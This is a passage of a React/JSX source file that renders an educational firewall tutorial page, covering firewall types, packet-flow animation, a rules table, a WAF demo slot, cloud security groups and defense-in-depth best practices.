              {["Types", "Flow Diagram", "Rules", "WAF Demo", "Cloud", "Best Practices"].map((s) => (
                <span key={s} style={{ fontSize: "0.72rem", padding: "3px 10px", borderRadius: 20, background: "var(--muted-bg)", color: "var(--muted)", border: "1px solid var(--card-border)" }}>{s}</span>
              ))}
            </div>
          </div>
        </div>
      </div>

      {/* ═══ SECTION 1: WHAT IS A FIREWALL ═══ */}
      <section style={{ marginBottom: "2.5rem" }}>
        <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: "1rem" }}>
          <div style={{ width: 4, height: 24, background: "var(--primary)", borderRadius: 2 }} />
          <h2 style={{ fontSize: "1.3rem", fontWeight: 800 }}>What is a Firewall?</h2>
          <span style={{ fontSize: "0.72rem", padding: "2px 8px", borderRadius: 6, background: "var(--primary-glow)", color: "var(--primary)", border: "1px solid var(--primary)40" }}>Section 1</span>
        </div>

        <div className="card anim-fadeup" style={{ borderLeft: "4px solid var(--primary)", marginBottom: "1rem" }}>
          <div style={{ display: "flex", gap: "1.5rem", flexWrap: "wrap" }}>
            <div style={{ flex: "2 1 300px" }}>
              <p style={{ fontSize: "0.95rem", lineHeight: 1.7, marginBottom: "0.75rem" }}>
                A <strong style={{ color: "var(--primary)" }}>firewall</strong> is a network security device or software that <strong>monitors and controls incoming and outgoing network traffic</strong> based on predetermined security rules. It acts as a barrier between trusted internal networks and untrusted external networks (like the internet).
              </p>
              <p style={{ fontSize: "0.9rem", lineHeight: 1.65, color: "var(--muted)" }}>
                Firewalls enforce an organization's security policy by permitting or blocking specific network traffic. Every packet traversing the firewall is evaluated against a ruleset — the firewall either <span style={{ color: "var(--success)", fontWeight: 600 }}>allows</span> or <span style={{ color: "var(--danger)", fontWeight: 600 }}>denies</span> it based on criteria like IP address, port, protocol, and application.
              </p>
            </div>
            <div style={{ flex: "1 1 200px", display: "flex", flexDirection: "column", gap: 10 }}>
              {[
                { icon: "🔍", label: "Monitors Traffic", desc: "Inspects every packet in/out" },
                { icon: "📋", label: "Enforces Rules", desc: "Allow / Deny based on policy" },
                { icon: "🚧", label: "Creates Barrier", desc: "Trusted vs untrusted zones" },
                { icon: "📊", label: "Logs Events", desc: "Audit trail for all decisions" },
              ].map((f) => (
                <div key={f.label} style={{ display: "flex", gap: 10, alignItems: "flex-start", padding: "8px 12px", borderRadius: 10, background: "var(--muted-bg)", border: "1px solid var(--card-border)" }}>
                  <span style={{ fontSize: "1.1rem" }}>{f.icon}</span>
                  <div>
                    <div style={{ fontSize: "0.8rem", fontWeight: 700 }}>{f.label}</div>
                    <div style={{ fontSize: "0.72rem", color: "var(--muted)" }}>{f.desc}</div>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>

        {/* Key concepts bar */}
        <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(180px, 1fr))", gap: "0.75rem" }}>
          {[
            { label: "OSI Layers", value: "3 – 7", color: "var(--primary)", sub: "Packet to Application" },
            { label: "Traffic Direction", value: "In + Out", color: "var(--secondary)", sub: "Ingress & Egress" },
            { label: "Rule Evaluation", value: "Top-Down", color: "var(--accent)", sub: "First match wins" },
            { label: "Default Posture", value: "Deny All", color: "var(--success)", sub: "Explicit allow" },
          ].map((c) => (
            <div key={c.label} className="card" style={{ borderTop: `3px solid ${c.color}`, textAlign: "center", padding: "0.85rem" }}>
              <div style={{ fontSize: "1.35rem", fontWeight: 900, color: c.color }}>{c.value}</div>
              <div style={{ fontSize: "0.78rem", fontWeight: 700, marginTop: 2 }}>{c.label}</div>
              <div style={{ fontSize: "0.68rem", color: "var(--muted)", marginTop: 2 }}>{c.sub}</div>
            </div>
          ))}
        </div>
      </section>

      {/* ═══ SECTION 2: TYPES OF FIREWALLS ═══ */}
      <section style={{ marginBottom: "2.5rem" }}>
        <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: "1rem" }}>
          <div style={{ width: 4, height: 24, background: "var(--secondary)", borderRadius: 2 }} />
          <h2 style={{ fontSize: "1.3rem", fontWeight: 800 }}>Types of Firewalls</h2>
          <span style={{ fontSize: "0.72rem", padding: "2px 8px", borderRadius: 6, background: "rgba(139,92,246,0.12)", color: "var(--secondary)", border: "1px solid rgba(139,92,246,0.3)" }}>Section 2</span>
        </div>
        <p style={{ color: "var(--muted)", marginBottom: "1.25rem", fontSize: "0.88rem" }}>
          Click any card to expand pros, cons, and examples. Firewalls are not one-size-fits-all — different types protect different OSI layers.
        </p>
        <div style={{ display: "flex", flexDirection: "column", gap: "0.75rem" }}>
          {FIREWALL_TYPES.map((fw) => <TypeCard key={fw.name} fw={fw} />)}
        </div>
      </section>

      {/* ═══ SECTION 3: ANIMATED FLOW DIAGRAM ═══ */}
      <section style={{ marginBottom: "2.5rem" }}>
        <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: "1rem" }}>
          <div style={{ width: 4, height: 24, background: "var(--accent)", borderRadius: 2 }} />
          <h2 style={{ fontSize: "1.3rem", fontWeight: 800 }}>How a Firewall Works</h2>
          <span style={{ fontSize: "0.72rem", padding: "2px 8px", borderRadius: 6, background: "rgba(6,182,212,0.12)", color: "var(--accent)", border: "1px solid rgba(6,182,212,0.3)" }}>Section 3 — Animated</span>
        </div>
        <p style={{ color: "var(--muted)", marginBottom: "1.25rem", fontSize: "0.88rem" }}>
          Live animation showing the packet lifecycle: arrival from the internet, firewall rule inspection, and the resulting ALLOW or DENY decision with corresponding routing.
        </p>
        <FlowDiagram />
        <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(200px, 1fr))", gap: "0.75rem", marginTop: "1rem" }}>
          {[
            { step: "1", title: "Packet Arrives", desc: "Network packet enters from the internet / external source", color: "var(--warning)" },
            { step: "2", title: "Rule Engine", desc: "Firewall evaluates rules top-to-bottom, first match wins", color: "var(--primary)" },
            { step: "3", title: "Decision: ALLOW", desc: "Packet forwarded to internal network / app server", color: "var(--success)" },
            { step: "4", title: "Decision: DENY", desc: "Packet dropped, event logged, alert generated", color: "var(--danger)" },
          ].map((s) => (
            <div key={s.step} className="card" style={{ borderLeft: `3px solid ${s.color}` }}>
              <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 4 }}>
                <div style={{ width: 24, height: 24, borderRadius: "50%", background: `${s.color}20`, border: `1.5px solid ${s.color}`, display: "flex", alignItems: "center", justifyContent: "center", fontSize: "0.75rem", fontWeight: 900, color: s.color }}>{s.step}</div>
                <span style={{ fontSize: "0.82rem", fontWeight: 700 }}>{s.title}</span>
              </div>
              <p style={{ fontSize: "0.78rem", color: "var(--muted)", lineHeight: 1.5 }}>{s.desc}</p>
            </div>
          ))}
        </div>
      </section>

      {/* ═══ SECTION 4: FIREWALL RULES ═══ */}
      <section style={{ marginBottom: "2.5rem" }}>
        <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: "1rem" }}>
          <div style={{ width: 4, height: 24, background: "var(--warning)", borderRadius: 2 }} />
          <h2 style={{ fontSize: "1.3rem", fontWeight: 800 }}>Firewall Rules Explained</h2>
          <span style={{ fontSize: "0.72rem", padding: "2px 8px", borderRadius: 6, background: "rgba(245,158,11,0.12)", color: "var(--warning)", border: "1px solid rgba(245,158,11,0.3)" }}>Section 4</span>
        </div>
        <p style={{ color: "var(--muted)", marginBottom: "1.25rem", fontSize: "0.88rem" }}>
          Firewall rules are processed top-to-bottom in priority order. The first matching rule wins. The final rule is always an implicit or explicit <strong>deny all</strong>.
        </p>

        <div className="card" style={{ overflow: "auto" }}>
          <table style={{ width: "100%", borderCollapse: "collapse", fontSize: "0.8rem" }}>
            <thead>
              <tr style={{ borderBottom: "2px solid var(--card-border)" }}>
                {["#", "Direction", "Protocol", "Source", "Destination", "Port", "Action", "Note"].map((h) => (
                  <th key={h} style={{ padding: "10px 12px", textAlign: "left", fontSize: "0.72rem", fontWeight: 700, color: "var(--muted)", whiteSpace: "nowrap" }}>{h}</th>
                ))}
              </tr>
            </thead>
            <tbody>
              {FIREWALL_RULES.map((rule, idx) => (
                <tr key={rule.id} style={{ borderBottom: "1px solid var(--card-border)", background: idx % 2 === 0 ? "transparent" : "var(--muted-bg)" }}>
                  <td style={{ padding: "9px 12px", fontWeight: 700, color: "var(--muted)", fontSize: "0.75rem" }}>{rule.id}</td>
                  <td style={{ padding: "9px 12px", whiteSpace: "nowrap" }}>
                    <span style={{ display: "inline-flex", alignItems: "center", gap: 4, fontSize: "0.73rem" }}>
                      {rule.direction === "Inbound" ? "↓" : "↑"}
                      <span>{rule.direction}</span>
                    </span>
                  </td>
                  <td style={{ padding: "9px 12px" }}>
                    <span style={{ padding: "2px 7px", borderRadius: 5, background: "var(--muted-bg)", fontSize: "0.72rem", fontWeight: 600, color: "var(--muted)", border: "1px solid var(--card-border)" }}>{rule.protocol}</span>
                  </td>
                  <td style={{ padding: "9px 12px", fontSize: "0.75rem", color: "var(--muted)", maxWidth: 150, wordBreak: "break-all" }}>{rule.source}</td>
                  <td style={{ padding: "9px 12px", fontSize: "0.75rem" }}>{rule.destination}</td>
                  <td style={{ padding: "9px 12px" }}>
                    <span style={{ fontFamily: "monospace", fontSize: "0.8rem", fontWeight: 700 }}>{rule.port}</span>
                  </td>
                  <td style={{ padding: "9px 12px" }}>
                    <span className={`badge ${rule.action === "ALLOW" ? "badge-low" : rule.id === 8 ? "badge-critical" : "badge-high"}`}
                      style={{ fontSize: "0.68rem", background: rule.action === "ALLOW" ? "rgba(16,185,129,0.15)" : undefined, color: rule.action === "ALLOW" ? "var(--success)" : undefined, border: rule.action === "ALLOW" ? "1px solid var(--success)40" : undefined }}>
                      {rule.action}
                    </span>
                  </td>
                  <td style={{ padding: "9px 12px", fontSize: "0.72rem", color: "var(--muted)", fontStyle: "italic" }}>{rule.note}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>

        <div style={{ marginTop: "1rem", padding: "0.85rem 1rem", borderRadius: 10, background: "rgba(245,158,11,0.08)", border: "1px solid rgba(245,158,11,0.25)", display: "flex", gap: 10, alignItems: "flex-start" }}>
          <span style={{ fontSize: "1.1rem", flexShrink: 0 }}>💡</span>
          <div style={{ fontSize: "0.82rem", lineHeight: 1.6 }}>
            <strong style={{ color: "var(--warning)" }}>Rule #8 (Default Deny)</strong> is the most important rule. Any traffic not explicitly matched by rules 1–7 is dropped and logged. This "catch-all" ensures zero unauthorized access — even if a rule is accidentally missing.
          </div>
        </div>
      </section>

      {/* ═══ SECTION 5: WAF IN ACTION ═══ */}
      <section style={{ marginBottom: "2.5rem" }}>
        <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: "1rem" }}>
          <div style={{ width: 4, height: 24, background: "var(--danger)", borderRadius: 2 }} />
          <h2 style={{ fontSize: "1.3rem", fontWeight: 800 }}>WAF in Action</h2>
          <span style={{ fontSize: "0.72rem", padding: "2px 8px", borderRadius: 6, background: "rgba(239,68,68,0.12)", color: "var(--danger)", border: "1px solid rgba(239,68,68,0.3)" }}>Section 5 — Interactive</span>
        </div>
        <p style={{ color: "var(--muted)", marginBottom: "1rem", fontSize: "0.88rem" }}>
          A Web Application Firewall sits between users and your app, inspecting every HTTP request. Click the buttons below to simulate sending different types of requests through the WAF and see the real-time inspection and result.
        </p>

        {/* WAF architecture overview */}
        <div className="card" style={{ marginBottom: "1.25rem", background: "linear-gradient(135deg, var(--muted-bg), var(--card))" }}>
          <div style={{ display: "flex", alignItems: "center", gap: 0, flexWrap: "wrap", justifyContent: "center" }}>
            {[
              { label: "User / Browser", icon: "👤", color: "var(--muted)" },
              { arrow: "→", color: "var(--muted)" },
              { label: "WAF", icon: "🛡️", color: "var(--primary)", highlight: true },
              { arrow: "→", color: "var(--muted)" },
              { label: "Load Balancer", icon: "⚖️", color: "var(--muted)" },
              { arrow: "→", color: "var(--muted)" },
              { label: "App Server", icon: "🖥️", color: "var(--muted)" },
              { arrow: "→", color: "var(--muted)" },
              { label: "Database", icon: "🗄️", color: "var(--muted)" },
            ].map((item, i) => (
              "arrow" in item ? (
                <span key={i} style={{ fontSize: "1.1rem", color: item.color, margin: "0 4px" }}>{item.arrow}</span>
              ) : (
                <div key={i} style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: 4, padding: "8px 12px", borderRadius: 10, background: item.highlight ? "var(--primary-glow)" : "transparent", border: item.highlight ? "1px solid var(--primary)" : "1px solid transparent" }}>
                  <span style={{ fontSize: "1.5rem" }}>{item.icon}</span>
                  <span style={{ fontSize: "0.68rem", fontWeight: 600, color: item.highlight ? "var(--primary)" : "var(--muted)", whiteSpace: "nowrap" }}>{item.label}</span>
                </div>
              )
            ))}
          </div>
          <div style={{ textAlign: "center", marginTop: 6, fontSize: "0.72rem", color: "var(--muted)" }}>
            WAF intercepts all HTTP/HTTPS traffic before it reaches your application
          </div>
        </div>

        <div className="card">
          <WAFDemo />
        </div>
      </section>

      {/* ═══ SECTION 6: CLOUD FIREWALL RULES ═══ */}
      <section style={{ marginBottom: "2.5rem" }}>
        <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: "1rem" }}>
          <div style={{ width: 4, height: 24, background: "#06b6d4", borderRadius: 2 }} />
          <h2 style={{ fontSize: "1.3rem", fontWeight: 800 }}>Cloud Firewall Rules</h2>
          <span style={{ fontSize: "0.72rem", padding: "2px 8px", borderRadius: 6, background: "rgba(6,182,212,0.12)", color: "#06b6d4", border: "1px solid rgba(6,182,212,0.3)" }}>Section 6 — AWS / Azure</span>
        </div>

        <p style={{ color: "var(--muted)", marginBottom: "1.25rem", fontSize: "0.88rem" }}>
          Cloud providers implement firewalls through Security Groups (AWS), Network Security Groups (Azure), and VPC Firewall Rules (GCP). These are managed via API, CLI, or IaC tools like Terraform.
        </p>

        <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(200px, 1fr))", gap: "0.75rem", marginBottom: "1.25rem" }}>
          {[
            { cloud: "AWS", product: "Security Groups", type: "Stateful", scope: "EC2 instance level", icon: "🟠" },
            { cloud: "AWS", product: "NACLs", type: "Stateless", scope: "Subnet level", icon: "🟠" },
            { cloud: "Azure", product: "NSG", type: "Stateful", scope: "Subnet / NIC level", icon: "🔵" },
            { cloud: "GCP", product: "VPC Firewall", type: "Stateful", scope: "VPC / tag level", icon: "🔴" },
          ].map((c) => (
            <div key={c.product} className="card" style={{ padding: "0.85rem" }}>
              <div style={{ display: "flex", gap: 8, alignItems: "center", marginBottom: 6 }}>
                <span style={{ fontSize: "1.3rem" }}>{c.icon}</span>
                <div>
                  <div style={{ fontSize: "0.8rem", fontWeight: 700 }}>{c.cloud} — {c.product}</div>
                  <div style={{ fontSize: "0.68rem", color: "var(--muted)" }}>{c.scope}</div>
                </div>
              </div>
              <span style={{ fontSize: "0.68rem", padding: "2px 8px", borderRadius: 5, background: c.type === "Stateful" ? "rgba(16,185,129,0.12)" : "rgba(245,158,11,0.12)", color: c.type === "Stateful" ? "var(--success)" : "var(--warning)", border: `1px solid ${c.type === "Stateful" ? "var(--success)" : "var(--warning)"}40` }}>{c.type}</span>
            </div>
          ))}
        </div>

        <div className="card" style={{ padding: 0, overflow: "hidden" }}>
          <div style={{ padding: "0.75rem 1rem", background: "var(--muted-bg)", borderBottom: "1px solid var(--card-border)", display: "flex", alignItems: "center", gap: 8 }}>
            <span style={{ fontSize: "0.85rem" }}>📄</span>
            <span style={{ fontSize: "0.8rem", fontWeight: 700 }}>terraform — aws_security_group + azure NSG</span>
            <span style={{ marginLeft: "auto", fontSize: "0.68rem", color: "var(--muted)" }}>Infrastructure as Code</span>
          </div>
          <pre className="code-block" style={{ margin: 0, borderRadius: 0, border: "none", maxHeight: 420, overflow: "auto", fontSize: "0.75rem", lineHeight: 1.6 }}>
            <code>{AWS_SG_EXAMPLE}</code>
          </pre>
        </div>
      </section>

      {/* ═══ SECTION 7: BEST PRACTICES ═══ */}
      <section style={{ marginBottom: "2.5rem" }}>
        <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: "1rem" }}>
          <div style={{ width: 4, height: 24, background: "var(--success)", borderRadius: 2 }} />
          <h2 style={{ fontSize: "1.3rem", fontWeight: 800 }}>Firewall Best Practices</h2>
          <span style={{ fontSize: "0.72rem", padding: "2px 8px", borderRadius: 6, background: "rgba(16,185,129,0.12)", color: "var(--success)", border: "1px solid rgba(16,185,129,0.3)" }}>Section 7</span>
        </div>
        <p style={{ color: "var(--muted)", marginBottom: "1.25rem", fontSize: "0.88rem" }}>
          Following these practices ensures your firewall provides maximum protection without becoming a bottleneck or creating a false sense of security.
        </p>

        <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(300px, 1fr))", gap: "0.75rem" }}>
          {BEST_PRACTICES.map((bp, idx) => {
            const priorityColor = bp.priority === "critical" ? "var(--danger)" : bp.priority === "high" ? "var(--warning)" : "var(--primary)";
            return (
              <div key={idx} className="card anim-fadeup" style={{ display: "flex", gap: 12, alignItems: "flex-start", borderLeft: `3px solid ${priorityColor}` }}>
                <div style={{ width: 40, height: 40, borderRadius: 10, background: `${priorityColor}15`, border: `1.5px solid ${priorityColor}30`, display: "flex", alignItems: "center", justifyContent: "center", fontSize: "1.2rem", flexShrink: 0 }}>
                  {bp.icon}
                </div>
                <div style={{ flex: 1 }}>
                  <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 4, flexWrap: "wrap" }}>
                    <span style={{ fontSize: "0.875rem", fontWeight: 700 }}>{bp.title}</span>
                    <span className={`badge badge-${bp.priority === "critical" ? "critical" : bp.priority === "high" ? "high" : "medium"}`} style={{ fontSize: "0.6rem" }}>{bp.priority}</span>
                  </div>
                  <p style={{ fontSize: "0.8rem", color: "var(--muted)", lineHeight: 1.55 }}>{bp.desc}</p>
                </div>
                <div style={{ color: "var(--success)", fontSize: "1rem", flexShrink: 0 }}>✓</div>
              </div>
            );
          })}
        </div>

        {/* Summary matrix */}
        <div className="card" style={{ marginTop: "1.25rem", background: "linear-gradient(135deg, var(--muted-bg), var(--card))" }}>
          <div style={{ fontSize: "0.85rem", fontWeight: 700, marginBottom: "0.75rem" }}>Defense-in-Depth: Layered Firewall Strategy</div>
          <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
            {[
              { layer: "Cloud / Edge", tools: "AWS WAF + Cloudflare + DDoS scrubbing", color: "var(--accent)" },
              { layer: "Network Perimeter", tools: "NGFW (Palo Alto / Fortinet) + IPS", color: "var(--primary)" },
              { layer: "Application (HTTP)", tools: "WAF (ModSecurity / AWS WAF) + Rate Limiting", color: "var(--warning)" },
              { layer: "Internal Segments", tools: "Security Groups + NSG + VPC flow logs", color: "var(--secondary)" },
              { layer: "Host / Endpoint", tools: "iptables / nftables / Windows Defender Firewall", color: "var(--success)" },
            ].map((l, i) => (
              <div key={i} style={{ display: "flex", alignItems: "center", gap: 12, padding: "8px 0", borderBottom: "1px solid var(--card-border)" }}>
                <div style={{ width: 8, height: 8, borderRadius: "50%", background: l.color, flexShrink: 0, boxShadow: `0 0 6px ${l.color}` }} />
                <div style={{ width: 160, fontSize: "0.78rem", fontWeight: 700, color: l.color, flexShrink: 0 }}>{l.layer}</div>
                <div style={{ fontSize: "0.78rem", color: "var(--muted)" }}>{l.tools}</div>
              </div>
            ))}
          </div>
          <div style={{ marginTop: "0.75rem", fontSize: "0.78rem", color: "var(--muted)", fontStyle: "italic" }}>
            No single firewall layer is sufficient alone. Attackers who bypass one layer should encounter the next.
          </div>
        </div>
      </section>

      {/* ═══ FOOTER CTA ═══ */}
      <div className="card anim-fadeup" style={{ textAlign: "center", padding: "2rem", background: "linear-gradient(135deg, var(--muted-bg), var(--card))", borderTop: "3px solid var(--primary)", marginBottom: "2rem" }}>
        <div style={{ fontSize: "2rem", marginBottom: 8 }}>🛡️</div>
        <h3 style={{ fontSize: "1.15rem", fontWeight: 800, marginBottom: 6 }}>
          <span className="gradient-text">Firewall Knowledge Complete</span>
        </h3>
        <p style={{ fontSize: "0.85rem", color: "var(--muted)", maxWidth: 500, margin: "0 auto 1.25rem" }}>
          You've covered firewall types, flow analysis, rule design, WAF capabilities, cloud implementations, and defense-in-depth best practices.
        </p>
        <div style={{ display: "flex", gap: 10, justifyContent: "center", flexWrap: "wrap" }}>
          <a href="/threats" className="btn-primary" style={{ fontSize: "0.85rem", textDecoration: "none" }}>Explore Threats →</a>
          <a href="/owasp" className="btn-outline" style={{ fontSize: "0.85rem", textDecoration: "none" }}>OWASP Top 10</a>
          <a href="/secure-coding" className="btn-outline" style={{ fontSize: "0.85rem", textDecoration: "none" }}>Secure Coding</a>
        </div>
      </div>

    </div>
  );
}
